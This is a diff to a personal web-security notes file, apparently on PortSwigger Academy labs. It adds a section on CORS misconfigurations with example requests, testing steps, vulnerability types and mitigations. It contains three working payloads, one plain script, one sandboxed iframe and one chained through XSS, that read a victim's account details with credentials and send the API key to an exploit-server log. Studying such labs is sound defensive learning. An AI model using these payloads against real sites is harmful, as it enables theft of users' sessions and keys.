@@ -1970,9 +1970,110 @@ email=wiener@normal-user.com
     ```
 
 ## CORS (Cross-Origin Resource Sharing)
-Details about CORS...
+if a user with an active session on `vulnerable.example.com` visits `http://malicious.com`, the malicious site can make an authenticated request to the vulnerable API and access the user's personal information.   
+```
+CORS request
 
+GET /api/userinfo HTTP/1.1
+Host: vulnerable.example.com
+Origin: http://malicious.com
+Cookie: sessionid=abc123
+
+CORS response
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+Content-Type: application/json
+
+{
+  "username": "victim",
+  "email": "victim@example.com",
+  "balance": "1000"
+}
+
+```
+
+**Testing for CORS misconfigurations**
+- change the origin header to an arbitrary value
+- change the origin header to the null value
+- change the origin header to one that begins with the origin of the site   
+- change the origin header to one that ends with the origin of the site   
+**Vulnerabilities**
+- Server-generated ACAO header from client-specified Origin header `Origin: https://example.com`   
+- CORS origin whitelists 'Access-Control-Allow-Origin: https://innocent-website.com`   
+- Whitelisted null origin value `Origin: null`   
+
+
+**Mitigation**
+- Limit Access-Control-Allow-Origin to specific, trusted origins.
+- Avoid using wildcard origins or credentials with wildcard origins.
+- 
 ### CORS Lab
+- Exploit the CORS misconfiguration to retrieve the administrator's API key
+  - check if CORS support > `Access-Control-Allow-Credential' in response
+  - Resubmit /accountDetails with header `Origin: https://example.com`   > observe that origin reflected in `Access-Control-Allow-Origin`
+  '''
+  Request
+  Origin: https://example.com
+  Response
+  Access-Control-Allow-Origin: https://example.com  
+      {
+        "username": "wiener",
+        "email": "",
+        "apikey": "gHGuXwc0L5A0Ii5rtMAPS2gkP8AVNWXl",
+        "sessions": [
+          "t6wRKbrHu9OxFSbKnOVeaCBNxWbbTJbm"
+        ]
+   }
+  '''
+  - Craft payload
+  ```
+  <script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+   </script>
+  ```
+  - Access log, retrieve the victim's API key
+- CORS vulnerability with trusted null origin
+  - Resubmit /accountDetails with header Origin: null >  observe that origin reflected in `Access-Control-Allow-Origin`
+  - Craft payload with sandbox iframe
+    ```
+    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
+    };
+   </script>"></iframe>
+    ```
+- CORS vulnerability with trusted insecure protocols
+  - a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information   
+  - Origin: http://subdomain.lab-id > Confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP
+  - Product page check stock and observe that it is loaded using a HTTP url on a subdomain. Observe that the product ID parameter is vulnerable to XSS
+  - Craft payload with XSS
+    ```
+    <script>
+    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); 
+    req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener()
+       {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+   </script>
+    ```
+  - 
+- ddd
 
 ## Clickjacking
 Details about Clickjacking...
